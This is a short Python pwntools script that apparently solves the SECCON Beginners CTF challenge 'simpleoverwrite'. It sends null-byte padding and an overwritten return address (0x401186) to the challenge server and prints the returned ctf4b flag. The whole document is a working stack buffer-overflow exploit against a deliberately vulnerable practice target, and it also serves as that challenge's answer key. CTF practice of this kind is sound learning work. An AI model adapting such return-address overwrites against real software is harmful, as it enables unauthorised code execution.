from pwn import *

r = remote("simpleoverwrite.beginners.seccon.games", 9001)

payload = p64(0x401186)
padding = b"\00" * 18

r.sendlineafter(b"input:", padding + payload)

print(r.recvline())
print(r.recvline())
print(r.recvline_startswith(b"ctf4b{"))
